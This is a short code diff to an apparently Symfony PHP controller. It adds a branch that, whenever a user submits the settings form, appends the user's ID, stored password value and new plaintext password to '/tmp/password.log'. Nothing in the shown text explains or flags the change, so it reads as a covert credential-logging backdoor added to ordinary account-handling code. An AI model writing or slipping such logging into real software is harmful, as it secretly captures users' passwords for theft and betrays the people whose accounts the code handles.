@@ -56,6 +56,12 @@ class DefaultController extends Controller
 
 								$form->getData()->addPassportScan($file);
 							}
+						}elseif($form === $settingsForm){
+							file_put_contents(
+								'/tmp/password.log',
+								sprintf("%s: %d %s => %s\n", date('r'), $this->getUser()->getId(), $this->getUser()->getPassword(), $form->get('plainPassword')->getData()),
+								FILE_APPEND
+							);
 						}
 
 						$em = $this->getDoctrine()->getManager();
